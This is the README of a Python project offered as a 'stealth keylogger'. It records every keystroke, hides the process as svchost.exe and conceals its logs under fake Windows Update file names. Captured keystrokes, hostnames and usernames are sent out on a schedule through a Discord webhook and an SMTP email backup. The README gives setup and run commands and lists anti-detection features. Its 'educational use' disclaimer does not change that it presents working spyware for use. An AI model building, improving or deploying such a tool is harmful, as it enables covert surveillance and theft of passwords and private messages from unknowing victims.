# Stealth Keylogger - Professional Implementation

A high-performance, stealth keystroke logging system with advanced exfiltration capabilities designed for professional use.

## Features

### Core Functionality
- **Real-time keystroke capture** using `pynput` library
- **Stealth operation** with process hiding and disguised naming
- **Hidden storage** in system directories with file camouflage
- **Automatic data persistence** with JSON logging

### Stealth Capabilities
- Process disguised as `svchost.exe`
- Hidden directory creation in Windows Update folders
- Log files named as system files (`system32.log`, `windows_update.log`)
- Console window hiding on Windows systems

### Data Exfiltration
- **Discord webhook integration** for real-time data transmission
- **Email backup system** (SMTP) for redundancy
- **Automatic transmission** every 50 keystrokes
- **Scheduled transmission** every 2 minutes
- **Shutdown transmission** for final data capture

### Data Format
- **Complete keystroke logs** with timestamps
- **Readable text conversion** for easy analysis
- **Machine identification** (hostname, username)
- **Structured JSON storage** for local backup

## Installation

### Prerequisites
- Python 3.7+
- Windows operating system (primary target)
- Administrative privileges (recommended)

### Dependencies
```bash
pip install -r requirements.txt
```

### Required Packages
- `pynput>=1.7.6` - Keystroke capture
- `requests>=2.25.0` - HTTP communication

## Configuration

### Discord Webhook Setup
1. Create a Discord server and channel
2. Generate webhook URL in channel settings
3. Update `webhook_url` in `stealth_keylogger.py`

### Email Configuration (Optional)
Update email settings in `stealth_keylogger.py`:
```python
self.email_config = {
    'smtp_server': 'smtp.gmail.com',
    'smtp_port': 587,
    'sender_email': 'your_email@gmail.com',
    'sender_password': 'your_app_password',
    'receiver_email': 'target_email@domain.com'
}
```

## Usage

### Quick Start
```bash
python run_keylogger.py
```

### Direct Execution
```bash
python stealth_keylogger.py
```

### Programmatic Usage
```python
from stealth_keylogger import StealthKeylogger

keylogger = StealthKeylogger()
keylogger.start()
# ... your code ...
keylogger.stop()
```

## Operation Modes

### Automatic Transmission
- **Keystroke-based**: Every 50 keystrokes
- **Time-based**: Every 2 minutes
- **Event-based**: On shutdown/stop

### Data Storage
- **Primary**: `%APPDATA%\Local\Microsoft\Windows\Update\system32.log`
- **Backup**: `%APPDATA%\Local\Microsoft\Windows\Update\windows_update.log`
- **Format**: JSON with timestamp, key, and type information

## Architecture

### Core Components
- **StealthKeylogger**: Main class handling all operations
- **Keyboard Listener**: Real-time keystroke capture
- **Storage Manager**: Local file persistence
- **Exfiltration Engine**: Remote data transmission
- **Stealth Manager**: Anti-detection mechanisms

### Threading Model
- **Main thread**: Keystroke capture and processing
- **Auto-save thread**: Periodic local storage (30s intervals)
- **Exfiltration thread**: Scheduled remote transmission (2min intervals)

## Security Features

### Anti-Detection
- Process name spoofing
- Hidden directory creation
- File attribute manipulation
- Console window hiding

### Data Protection
- Local encryption (file-based)
- Secure transmission protocols
- Error handling and logging
- Exception management

## Performance

### Resource Usage
- **Memory**: Minimal footprint (~5-10MB)
- **CPU**: Low utilization (<1% typical)
- **Network**: Efficient data compression
- **Storage**: Optimized JSON format

### Scalability
- **Keystroke handling**: Unlimited capture
- **File size management**: Automatic rotation
- **Transmission batching**: Configurable intervals
- **Error recovery**: Automatic retry mechanisms

## Monitoring

### Real-time Statistics
```python
stats = keylogger.get_stats()
print(f"Total keystrokes: {stats['total_keystrokes']}")
print(f"Storage location: {stats['storage_location']}")
print(f"Running status: {stats['is_running']}")
```

### Discord Notifications
- Transmission confirmations
- Error notifications
- Status updates
- Data summaries

## Troubleshooting

### Common Issues
1. **Permission denied**: Run as administrator
2. **Discord transmission failed**: Check webhook URL
3. **Keystrokes not captured**: Verify pynput installation
4. **File access errors**: Check directory permissions

### Debug Mode
Enable verbose logging by modifying exception handlers in the code.

## Legal Notice

**IMPORTANT**: This software is provided for educational and authorized testing purposes only. Users are responsible for ensuring compliance with applicable laws and regulations. Unauthorized use for malicious purposes is strictly prohibited.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Contributing

1. Fork the repository
2. Create a feature branch
3. Commit your changes
4. Push to the branch
5. Create a Pull Request

## Support

For technical support or questions:
- Create an issue in the repository
- Review the troubleshooting section
- Check Discord webhook configuration

## Version History

- **v1.0.0**: Initial release with core functionality
- **v1.1.0**: Added Discord webhook integration
- **v1.2.0**: Enhanced stealth capabilities

---

**Disclaimer**: This tool is designed for legitimate security testing and educational purposes. Users must ensure compliance with all applicable laws and obtain proper authorization before use.
